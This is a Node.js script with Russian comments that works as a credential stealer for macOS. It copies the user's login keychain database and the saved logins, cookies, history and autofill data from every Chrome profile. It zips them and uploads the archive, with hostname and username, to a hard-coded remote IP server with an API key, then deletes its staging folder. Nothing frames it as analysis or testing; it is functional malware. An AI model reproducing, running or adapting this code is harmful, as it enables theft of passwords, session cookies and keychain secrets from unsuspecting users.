// collect-and-upload.js - Единый скрипт для сбора и отправки данных
const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec, execSync } = require('child_process');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');

// ===================== КОНФИГУРАЦИЯ =====================
const CONFIG = {
    // Адрес сервера для отправки данных
    serverUrl: 'http://77.239.97.85:8088/api/files/upload',
    apiKey: 'tJz4uRVCwl2eEwyPTudYP9iGRfgq',
    
    // Настройки передачи файлов
    chunkSize: 256 * 1024,        // 256KB размер чанка
    retryDelay: 5000,             // 5 секунд между попытками
    maxRetries: 5,                // Максимум 5 попыток
    timeout: 120000,              // 2 минуты таймаут
    
    // Директории
    stableDir: 'Stable',          // Директория для сбора данных
    zipFileName: 'Stable.zip',    // Имя архива
    
    // Список важных файлов Chrome для копирования
    chromeImportantFiles: [
        'Web Data', 'Web Data-journal', 
        'Login Data', 'Login Data-journal', 
        'History', 'History-journal', 
        'Cookies', 'Cookies-journal', 
        'Bookmarks', 
        'Secure Preferences'
    ]
};

// ===================== УТИЛИТЫ ЛОГИРОВАНИЯ =====================
// Функция для логирования
function log(message, isError = false) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}`;
    
    if (isError) {
        console.error(logMessage);
    } else {
        console.log(logMessage);
    }
    
    try {
        fs.appendFileSync('collector.log', `${logMessage}\n`);
    } catch (error) {
        console.error(`Error writing to log: ${error.message}`);
    }
}

// ===================== УТИЛИТЫ ДЛЯ РАБОТЫ С ФАЙЛАМИ =====================
// Функция для создания директории
function createDirectory(dirPath) {
    try {
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
            log(`Directory created: ${dirPath}`);
        } else {
            log(`Directory already exists: ${dirPath}`);
        }
        return true;
    } catch (error) {
        log(`Error creating directory ${dirPath}: ${error.message}`, true);
        return false;
    }
}

// Функция для копирования файла
function copyFile(source, destination) {
    try {
        fs.copyFileSync(source, destination);
        log(`File copied: ${source} -> ${destination}`);
        return true;
    } catch (error) {
        log(`Error copying file ${source}: ${error.message}`, true);
        return false;
    }
}

// Функция для выполнения команды
function executeCommand(command) {
    try {
        log(`Executing command: ${command}`);
        const output = execSync(command, { encoding: 'utf8' });
        log(`Command output: ${output.trim()}`);
        return { success: true, output };
    } catch (error) {
        log(`Error executing command: ${error.message}`, true);
        if (error.stderr) log(`stderr: ${error.stderr}`, true);
        return { success: false, error };
    }
}

// Функция для форматирования размера файла
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Функция для генерации уникального ID клиента
function generateClientId() {
    try {
        const macAddress = getMacAddress();
        const hostname = os.hostname();
        const username = os.userInfo().username;
        
        const hash = crypto.createHash('md5')
            .update(`${macAddress}:${hostname}:${username}`)
            .digest('hex')
            .substring(0, 8);
        
        return hash;
    } catch (error) {
        return Math.random().toString(36).substring(2, 10);
    }
}

// Функция для получения MAC-адреса
function getMacAddress() {
    try {
        const networkInterfaces = os.networkInterfaces();
        for (const name of Object.keys(networkInterfaces)) {
            for (const netInterface of networkInterfaces[name]) {
                if (!netInterface.internal && netInterface.mac !== '00:00:00:00:00:00') {
                    return netInterface.mac;
                }
            }
        }
        return 'unknown';
    } catch (error) {
        return 'unknown';
    }
}

// ===================== СБОР ДАННЫХ =====================
// Функция для сбора всех необходимых данных
async function collectData() {
    try {
        log('===== НАЧАЛО СБОРА ДАННЫХ =====');
        
        // 1. Создаем директорию Stable
        if (!createDirectory(CONFIG.stableDir)) {
            throw new Error('Failed to create Stable directory');
        }
        
        // 2. Получаем имя пользователя
        const username = os.userInfo().username;
        log(`Current user: ${username}`);
        
        // 3. Копируем Keychain базу данных
        const keychainSource = `/Users/${username}/Library/Keychains/login.keychain-db`;
        const keychainTarget = path.join(CONFIG.stableDir, 'login.keychain-db');
        
        if (fs.existsSync(keychainSource)) {
            copyFile(keychainSource, keychainTarget);
        } else {
            log(`Keychain file not found: ${keychainSource}`, true);
        }
        
        // 4. Копируем данные Chrome для всех профилей
        try {
            // Базовая директория Chrome
            const chromeBaseDir = `/Users/${username}/Library/Application Support/Google/Chrome`;
            
            // Проверяем наличие директории Chrome
            if (fs.existsSync(chromeBaseDir)) {
                // Получаем список всех профилей
                const profileDirs = [];
                
                // Добавляем стандартный профиль
                if (fs.existsSync(path.join(chromeBaseDir, 'Default'))) {
                    profileDirs.push('Default');
                }
                
                // Ищем другие профили (Profile 1, Profile 2, и т.д.)
                try {
                    const dirEntries = fs.readdirSync(chromeBaseDir, { withFileTypes: true });
                    for (const entry of dirEntries) {
                        if (entry.isDirectory() && entry.name.startsWith('Profile ')) {
                            profileDirs.push(entry.name);
                        }
                    }
                } catch (e) {
                    log(`Error scanning Chrome profiles: ${e.message}`, true);
                }
                
                log(`Found ${profileDirs.length} Chrome profiles: ${profileDirs.join(', ')}`);
                
                // Копируем данные из каждого профиля
                for (const profile of profileDirs) {
                    const profileSourceDir = path.join(chromeBaseDir, profile);
                    const profileTargetDir = path.join(CONFIG.stableDir, `Chrome_${profile}`);
                    
                    // Создаем директорию для профиля
                    createDirectory(profileTargetDir);
                    
                    // Копируем важные файлы
                    for (const file of CONFIG.chromeImportantFiles) {
                        const sourcePath = path.join(profileSourceDir, file);
                        const targetPath = path.join(profileTargetDir, file);
                        
                        if (fs.existsSync(sourcePath)) {
                            copyFile(sourcePath, targetPath);
                        } else {
                            log(`Chrome file not found in profile ${profile}: ${sourcePath}`);
                        }
                    }
                    
                    log(`Chrome data for profile ${profile} copied successfully`);
                }
            } else {
                log(`Chrome directory not found: ${chromeBaseDir}`, true);
            }
        } catch (error) {
            log(`Error copying Chrome data: ${error.message}`, true);
        }
        
        // 6. Создаем архив с оптимальными параметрами сжатия
        log('Creating ZIP archive...');
        const zipResult = executeCommand(`zip -r -1 ${CONFIG.zipFileName} ${CONFIG.stableDir} -x "*.DS_Store"`);
        
        if (!zipResult.success) {
            throw new Error('Failed to create ZIP archive');
        }
        
        log('ZIP archive created successfully');
        
        // Проверяем, что архив создан и получаем его размер
        if (fs.existsSync(CONFIG.zipFileName)) {
            const stats = fs.statSync(CONFIG.zipFileName);
            log(`Archive size: ${formatFileSize(stats.size)}`);
        } else {
            throw new Error('ZIP archive file not found after creation');
        }
        
        log('===== СБОР ДАННЫХ ЗАВЕРШЕН =====');
        return true;
    } catch (error) {
        log(`Error in data collection: ${error.message}`, true);
        return false;
    }
}

// ===================== ОТПРАВКА ДАННЫХ =====================
// Функция для отправки файла
async function uploadFile(retryCount = 0) {
    try {
        const filePath = path.join(process.cwd(), CONFIG.zipFileName);
        
        // Проверяем существование файла
        if (!fs.existsSync(filePath)) {
            log(`КРИТИЧЕСКАЯ ОШИБКА: Файл не найден: ${filePath}`, true);
            log(`Текущая директория: ${process.cwd()}`, true);
            log(`Содержимое директории: ${fs.readdirSync(process.cwd()).join(', ')}`, true);
            return false;
        }

        // Получаем статистику файла
        const fileStats = fs.statSync(filePath);
        const fileSize = fileStats.size;
        log(`Размер файла: ${fileSize} байт (${formatFileSize(fileSize)})`);
        
        if (fileSize === 0) {
            log(`ОШИБКА: Файл ${CONFIG.zipFileName} имеет нулевой размер!`, true);
            return false;
        }

        // Создаем FormData
        const formData = new FormData();
        formData.append('file', fs.createReadStream(filePath), {
            filename: path.basename(filePath),
            contentType: 'application/zip',
            knownLength: fileSize // Явно указываем размер файла
        });

        // Системная информация
        const systemInfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            type: os.type(),
            arch: os.arch(),
            username: os.userInfo().username,
            id: generateClientId()
        };

        log(`===== НАЧАЛО ОТПРАВКИ АРХИВА =====`);
        log(`Информация о системе: ${JSON.stringify(systemInfo)}`);
        log(`URL сервера: ${CONFIG.serverUrl}`);
        
        // Отправляем файл с мониторингом прогресса загрузки
        const startTime = Date.now();
        log(`Отправка началась в: ${new Date(startTime).toISOString()}`);
        
        // Отправляем файл
        const response = await axios.post(CONFIG.serverUrl, formData, {
            headers: {
                ...formData.getHeaders(),
                'X-Client-Info': JSON.stringify(systemInfo),
                'Content-Length': formData.getLengthSync() // Устанавливаем точный Content-Length
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: CONFIG.timeout,
            onUploadProgress: (progressEvent) => {
                const percentCompleted = Math.round((progressEvent.loaded * 100) / progressEvent.total);
                log(`Прогресс загрузки: ${percentCompleted}% (${formatFileSize(progressEvent.loaded)}/${formatFileSize(progressEvent.total)})`);
            }
        });

        const endTime = Date.now();
        const duration = (endTime - startTime) / 1000; // в секундах
        const speed = fileSize / duration / 1024; // KB/s
        
        log(`Загрузка завершена за ${duration.toFixed(1)} секунд (${speed.toFixed(2)} KB/s)`);
        log(`Статус ответа: ${response.status}`);
        log(`Ответ сервера: ${JSON.stringify(response.data)}`);
        log(`===== ОТПРАВКА АРХИВА ЗАВЕРШЕНА =====`);
        
        return response.data.success;
    } catch (error) {
        // Детальное логирование ошибок
        log(`ОШИБКА ПРИ ЗАГРУЗКЕ (попытка ${retryCount + 1}/${CONFIG.maxRetries}):`, true);
        
        if (error.response) {
            // Сервер ответил с ошибкой
            log(`Статус ошибки: ${error.response.status}`, true);
            log(`Данные ошибки: ${JSON.stringify(error.response.data)}`, true);
        } else if (error.request) {
            // Запрос был сделан, но нет ответа
            log('Нет ответа от сервера', true);
            log(`Тип ошибки: ${error.code}`, true);
        } else {
            // Что-то пошло не так при настройке запроса
            log(`Ошибка настройки: ${error.message}`, true);
        }
        
        // Попробуем повторить запрос, если не превышено максимальное количество попыток
        if (retryCount < CONFIG.maxRetries) {
            log(`Повторная попытка через ${CONFIG.retryDelay / 1000} секунд...`);
            await new Promise(resolve => setTimeout(resolve, CONFIG.retryDelay));
            return uploadFile(retryCount + 1);
        }
        
        log(`Превышено максимальное количество попыток (${CONFIG.maxRetries})`, true);
        return false;
    }
}

// ===================== ГЛАВНАЯ ФУНКЦИЯ =====================
async function main() {
    try {
        log('========== НАЧАЛО ПРОЦЕССА СБОРА И ОТПРАВКИ ДАННЫХ ==========');
        log(`Версия Node.js: ${process.version}`);
        log(`Платформа: ${process.platform}`);
        log(`Директория запуска: ${process.cwd()}`);
        
        // Проверяем наличие необходимых пакетов
        try {
            if (!fs.existsSync('./node_modules/axios') || !fs.existsSync('./node_modules/form-data')) {
                log('Установка необходимых зависимостей...');
                execSync('npm install axios form-data');
                log('Зависимости успешно установлены');
            }
        } catch (error) {
            log(`Предупреждение: Не удалось проверить/установить зависимости: ${error.message}`);
        }
        
        // 1. Собираем данные
        const collectionSuccess = await collectData();
        
        if (!collectionSuccess) {
            log('Сбор данных завершился с ошибкой', true);
            process.exit(1);
        }
        
        // 2. Отправляем архив
        const uploadSuccess = await uploadFile();
        
        if (uploadSuccess) {
            log('========== СБОР И ОТПРАВКА ДАННЫХ УСПЕШНО ЗАВЕРШЕНЫ ==========');
            
            // Пытаемся удалить временные файлы
            try {
                if (fs.existsSync(CONFIG.stableDir)) {
                    executeCommand(`rm -rf ${CONFIG.stableDir}`);
                    log(`Временная директория ${CONFIG.stableDir} удалена`);
                }
            } catch (cleanupError) {
                log(`Предупреждение: Ошибка при удалении временных файлов: ${cleanupError.message}`);
            }
            
            process.exit(0);
        } else {
            log('========== ОШИБКА ОТПРАВКИ ДАННЫХ ==========', true);
            process.exit(1);
        }
    } catch (error) {
        log(`ФАТАЛЬНАЯ ОШИБКА: ${error.message}`, true);
        log(`Стек ошибки: ${error.stack}`, true);
        process.exit(1);
    }
}

// Запускаем основную функцию
main();